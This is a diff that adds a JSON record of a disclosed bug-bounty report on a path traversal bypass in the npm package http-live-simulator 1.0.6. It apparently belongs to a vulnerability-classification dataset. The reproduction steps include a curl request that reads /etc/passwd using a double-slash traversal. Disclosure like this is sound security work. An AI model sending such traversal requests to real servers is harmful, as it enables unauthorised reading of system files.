@@ -1,0 +1,42 @@
+{
+    "reported_to": "Node.js third-party modules",
+    "reported_by": "3la2kb ",
+    "title": "[http-live-simulator] Path traversal vulnerability",
+    "content": "\nModule\nmodule name: http-live-simulator\nversion: 1.0.6\nnpm page: https://www.npmjs.com/package/http-live-simulator\n## Description\nthis vulnerability is a bypass for the one found in this report in version 1.0.5\nSteps To Reproduce:\n1- Install the module : npm install -g http-live-simulator\n2- Run the server : http-live\n3- Attempt to access a file from outside that project's directory, such as curl --path-as-is http://localhost:8080//../../../../etc/passwd\nThe bypass\nadding an extra / after the URL like :\nhttp://localhost:8080//../../../../etc/passwd\nmention the double slashes after the port number\nImpact\npath traversal vulnerability leading to read access in arbitrary files on disk\n\n",
+    "severity": [
+        7.5,
+        null
+    ],
+    "bounty": null,
+    "weaknesses": [
+        "Path Traversal"
+    ],
+    "screenshots": {},
+    "disclosed_date": 1546009620,
+    "report_url": "https://hackerone.com/reports/411405",
+    "is_multi_component": false,
+    "complexity": "LOW",
+    "novelty": "LOW",
+    "vuln_category": "CODE",
+    "steps": [
+        [
+            1,
+            "Install the module: npm install -g http-live-simulator"
+        ],
+        [
+            2,
+            "Run the server: http-live"
+        ],
+        [
+            3,
+            "Access a file from outside the project's directory using curl: curl --path-as-is http://localhost:8080//../../../../etc/passwd"
+        ]
+    ],
+    "vuln_description": "The vulnerability is a path traversal issue in the 'http-live-simulator' module (version 1.0.6), allowing an attacker to read arbitrary files on the server by bypassing directory restrictions. This is achieved by adding an extra slash after the URL (e.g., http://localhost:8080//../../../../etc/passwd), which bypasses the fix implemented in version 1.0.5.",
+    "reason": "The attack is straightforward and does not involve multiple components, complex states, or novel logic. It simply requires knowledge of path traversal techniques and the specific bypass method (adding an extra slash). The interaction is obvious once the bypass method is known.",
+    "new_complexity": "LOW",
+    "requires_code": false,
+    "requires_CVE": false,
+    "is_ctf": false,
+    "other_report": null
+}
